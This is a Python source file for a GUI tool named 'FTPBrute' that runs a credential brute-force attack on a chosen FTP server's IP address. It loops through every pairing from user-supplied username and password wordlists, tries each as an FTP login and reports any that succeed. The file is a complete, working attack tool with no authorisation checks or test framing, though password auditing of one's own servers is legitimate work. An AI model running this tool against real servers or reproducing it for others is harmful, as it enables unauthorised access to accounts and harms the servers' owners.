import ftplib
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import itertools
import threading

class FTPBruteForceTool:
    def __init__(self, root):
        self.root = root
        self.root.title("FTPBrute")  # Set window title
        self.root.geometry("500x500")
        self.is_running = False  # Control flag for stopping the brute force

        # Tool name label at the top
        tool_name_label = tk.Label(root, text="FTPBrute", font=("Arial", 16, "bold"))
        tool_name_label.pack(pady=10)

        # Target IP entry
        tk.Label(root, text="Target FTP IP Address:").pack(pady=5)
        self.target_entry = tk.Entry(root, width=40)
        self.target_entry.pack(pady=5)

        # Username wordlist
        tk.Label(root, text="Username Wordlist:").pack(pady=5)
        self.username_file = tk.StringVar()
        self.username_btn = tk.Button(root, text="Select Username Wordlist", command=self.load_username_file)
        self.username_btn.pack(pady=5)

        # Password wordlist
        tk.Label(root, text="Password Wordlist:").pack(pady=5)
        self.password_file = tk.StringVar()
        self.password_btn = tk.Button(root, text="Select Password Wordlist", command=self.load_password_file)
        self.password_btn.pack(pady=5)

        # Output area
        self.output_area = scrolledtext.ScrolledText(root, width=50, height=10, state='disabled')
        self.output_area.pack(pady=10)

        # Start and Stop buttons
        self.start_btn = tk.Button(root, text="Start Brute Force", command=self.start_bruteforce)
        self.start_btn.pack(pady=5)
        self.stop_btn = tk.Button(root, text="Stop Brute Force", command=self.stop_bruteforce, state='disabled')
        self.stop_btn.pack(pady=5)

        # Copyright notice in large font
        copyright_label = tk.Label(
            root,
            text="This tool was created by Sreeraj",
            font=("Arial", 14, "bold"),
            fg="gray"  # Optional color to make it stand out
        )
        copyright_label.pack(side="bottom", pady=15)

    def load_username_file(self):
        """Load the username wordlist file."""
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.username_file.set(file_path)
            self.username_btn.config(text=f"Selected: {file_path.split('/')[-1]}")

    def load_password_file(self):
        """Load the password wordlist file."""
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.password_file.set(file_path)
            self.password_btn.config(text=f"Selected: {file_path.split('/')[-1]}")

    def start_bruteforce(self):
        """Start the brute force attack in a separate thread."""
        target_ip = self.target_entry.get()
        username_file = self.username_file.get()
        password_file = self.password_file.get()

        if not target_ip or not username_file or not password_file:
            messagebox.showwarning("Input Error", "Please fill all fields and select both wordlists.")
            return

        self.is_running = True
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')

        # Run brute-force in a separate thread
        threading.Thread(target=self.bruteforce_attempt, args=(target_ip, username_file, password_file)).start()

    def bruteforce_attempt(self, target_ip, username_file, password_file):
        """Perform brute force attack."""
        try:
            with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
                usernames = [line.strip() for line in uf.readlines()]
                passwords = [line.strip() for line in pf.readlines()]

            self.output_area.config(state='normal')
            self.output_area.delete(1.0, tk.END)
            self.output_area.insert(tk.END, f"Starting brute force on {target_ip}...\n")
            self.output_area.config(state='disabled')

            for username, password in itertools.product(usernames, passwords):
                if not self.is_running:
                    self.output_area.config(state='normal')
                    self.output_area.insert(tk.END, "Brute force stopped.\n")
                    self.output_area.config(state='disabled')
                    break

                self.output_area.config(state='normal')
                self.output_area.insert(tk.END, f"Trying {username}:{password}\n")
                self.output_area.config(state='disabled')
                self.output_area.yview(tk.END)
                self.root.update()

                # Attempt FTP login
                try:
                    ftp = ftplib.FTP(target_ip)
                    ftp.login(user=username, passwd=password)
                    self.output_area.config(state='normal')
                    self.output_area.insert(tk.END, f"[SUCCESS] Username: {username}, Password: {password}\n")
                    self.output_area.config(state='disabled')
                    ftp.quit()
                    break
                except ftplib.error_perm:
                    # Login failed, continue
                    continue
                except Exception as e:
                    messagebox.showerror("Connection Error", f"Could not connect to FTP server: {e}")
                    break

            self.output_area.config(state='normal')
            self.output_area.insert(tk.END, "Brute force completed.\n")
            self.output_area.config(state='disabled')

        except Exception as e:
            messagebox.showerror("File Error", f"Error reading wordlist files: {e}")

        finally:
            self.is_running = False
            self.start_btn.config(state='normal')
            self.stop_btn.config(state='disabled')

    def stop_bruteforce(self):
        """Stop the brute force attack."""
        self.is_running = False
        self.stop_btn.config(state='disabled')

# Run the GUI application
if __name__ == "__main__":
    root = tk.Tk()
    app = FTPBruteForceTool(root)
    root.mainloop()